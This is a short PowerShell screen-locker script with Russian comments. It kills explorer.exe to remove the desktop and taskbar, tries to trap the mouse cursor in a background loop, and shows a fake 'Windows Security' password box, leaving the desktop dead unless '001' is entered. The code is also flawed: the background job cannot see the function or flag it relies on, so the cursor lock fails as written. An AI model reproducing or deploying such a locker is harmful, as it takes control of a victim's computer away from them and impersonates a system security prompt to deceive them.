# === БЛОКИРОВКА И ЗАХВАТ ===
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName Microsoft.VisualBasic

# Убиваем explorer (desktop + панель задач)
Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue

# Функция жёсткой блокировки ввода (мышь + клавиатура кроме цифр и Enter)
$global:Blocked = $true

function Block-Input {
    while ($global:Blocked) {
        # Фиксируем курсор в углу
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(10,10)
        
        # Можно добавить перехват клавиш, но для простоты оставляем агрессивный цикл
        Start-Sleep -Milliseconds 5
    }
}

# Запускаем блокировку в фоне
$blockJob = Start-Job -ScriptBlock { Block-Input }

# Окно ввода пароля
$result = [Microsoft.VisualBasic.Interaction]::InputBox("Введите пароль для разблокировки:", "Windows Security", "")

if ($result -eq "001") {
    $global:Blocked = $false
    Stop-Job $blockJob
    Remove-Job $blockJob
    
    # Восстанавливаем desktop
    Start-Process explorer.exe
    
    [System.Windows.Forms.MessageBox]::Show("Пароль верный. Доступ восстановлен.", "Success", "OK", "Information") | Out-Null
} else {
    # Неправильный пароль — продолжаем блокировку
    [System.Windows.Forms.MessageBox]::Show("Неверный пароль! Система остаётся заблокированной.", "Access Denied", "OK", "Error") | Out-Null
    # Desktop остаётся убитым
}
